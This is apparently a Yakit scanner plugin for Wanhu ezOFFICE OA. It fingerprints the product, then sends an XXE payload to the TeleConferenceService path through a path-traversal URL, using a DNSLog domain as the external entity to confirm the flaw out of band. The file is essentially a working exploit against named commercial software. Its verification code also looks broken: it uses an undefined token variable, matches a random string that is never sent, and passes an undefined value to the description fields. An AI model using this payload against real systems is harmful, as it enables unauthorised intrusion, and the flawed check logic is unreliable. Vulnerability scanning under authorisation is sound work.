yakit.AutoInitYakit()
//loglevel("debug")
// 准备发送的报文模版
PacketGet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
`

PacketVulGet = `GET / HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip,deflate
Accept-Charset:{{params(payload)}}
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cache-Control: no-cache
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0`

//指纹识别规则
fingerprint = "万户网络-ezOFFICE"
fingerRules = []

addfingerRule = func(packet, payload, check) {
    fingerRules = append(
        fingerRules, 
        {"packet": packet, "payload": payload, "check": check}, 
    )
}

//添加具体的识别规则
addfingerRule(
    PacketGet, 
    "/defaultroot/scripts/util/login.js", 
    func(rsp, header, body) {
        if str.MatchAnyOfSubString(body, "ezOFFICE") {
            return true
        }

        return false
    }, 
)

//漏洞检测规则函数
rules = []
addRule = func(packets, payloads, check, riskType, riskTypeVerbose, severity, reference) {
    rules = append(
        rules, 
        {"packets": packets, "payloads": payloads, "check": check, "type": riskType, "typeVerbose": riskTypeVerbose, "severity": severity, "reference": reference}, 
    )
}

rand_Payload = str.RandStr(10)

_server = ""
_token = ""

requireOnce = sync.NewOnce()
requireDNSLog = () => {
    if _token != "" {
        return str.RandStr(12) + "." + _server, _token
    }

    requireOnce.Do(() => {
        _server, _token = risk.NewDNSLogDomain()~
        println("dnslog server: %v" % _server)
        println("dnslog token: %v" % _token)
        _server = str.RandStr(12) + "." + _server
    })
    return _server, _token
}

PacketPost = () => {
    server, token = requireDNSLog()
    return `POST {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Referer: http://{{params(target)}}/

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://` + server + `" >]>        
<value>&xxe;</value>`
}

//填充对应的漏洞检测规则
addRule(
    [PacketPost], 
    [`/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService`], 
    func(all_rspIns, all_header, all_body) {
        if len(all_rspIns) > 0 {
            detail, err := risk.CheckDNSLogByToken(token)
            die(err)
            if len(detail) > 0 && str.MatchAllOfSubString(detail[0], rand_Payload) {
                println("dnslog result: ", detail[0])
                return true
            }

        }


        return false
    }, 
    "XXE注入", 
    "XXE注入", 
    "high", 
    "万户OA TeleConferenceService XXE注入漏洞", 
)

//漏洞检测handle
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func {
        defer swg.Done()


        defer func {
            recover()
        }


        all_rspIns = []
        all_header = []
        all_body = []
        url := ""
        resp := ""
        req := ""
        for n, payload := range rule.payloads {
            resp, req, err = poc.HTTP(
                rule["packets"][n], 
                poc.https(isTls), 
                poc.params({"target": addr, "payload": payload}), 
            )
            if err != nil {
                yakit.Error("poc.HTTP error: %v", err)
                return
            }


            header, body = poc.Split(resp)
            rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
            urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
            url = urlIns.String()
            all_rspIns = append(all_rspIns, rspIns)
            all_header = append(all_header, header)
            all_body = append(all_body, body)
        }


        if rule.check(all_rspIns, all_header, all_body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, 
                risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)), 
                risk.titleVerbose(sprintf("%v", rule.reference)), 
                risk.type("xxe"), 
                risk.typeVerbose(rule.typeVerbose), 
                risk.payload(rule.payloads[0]), 
                risk.details({"request": req, "response": resp, "url": url}), 
                risk.description(i), 
                risk.solution(i), 
            )
            return
        }


        return
    }
}

//指纹识别handle
handlefingerRule = func(isTls, addr, rule) {
    defer func {
        recover()
    }


    resp, req, err = poc.HTTP(
        rule["packet"], 
        poc.https(isTls), 
        poc.params({"target": addr, "payload": rule.payload}), 
    )
    if err != nil {
        yakit.Error("poc.HTTP error: %v", err)
        return false
    }


    header, body = poc.Split(resp)
    rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
    urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
    url = urlIns.String()
    if rule.check(rspIns, header, body) {
        yakit.Info("%v detected ", fingerprint)
        risk.NewRisk(
            url, 
            risk.severity("low"), 
            risk.title(sprintf("%v detected ", fingerprint)), 
            risk.type("fingerprint"), 
            risk.typeVerbose(fingerprint + " fingerprint Identification"), 
            risk.payload(rule.payload), 
            risk.details({"request": req, "response": resp, "url": url}), 
            risk.description(""), 
            risk.solution(""), 
        )
        return true
    }


    return false
}

handle = func(result) {
    if !result.IsOpen() {
        return
    }



//判断是否是http
//yakit.Info("no http", dump(result.Fingerprint))
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }


    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
    fingerHit = false
    yakit.Info("start to %s fingerprint identification", fingerprint)

    //指纹识别
    for _, fingerRule = range fingerRules {
        if handlefingerRule(isTls, addr, fingerRule) {
            fingerHit = true
            break
        }

    }


    if !fingerHit {
        return
    }

//漏洞检测
    yakit.Info("start to %s vuln identification", fingerprint)
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        if "packets" in rule {
            rule.packets = rule.packets.Map(i => {
                if f`${type(i)}`.Contains("Function") {
                    return i()
                } else {
                    return i
                }

            })
        }

        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
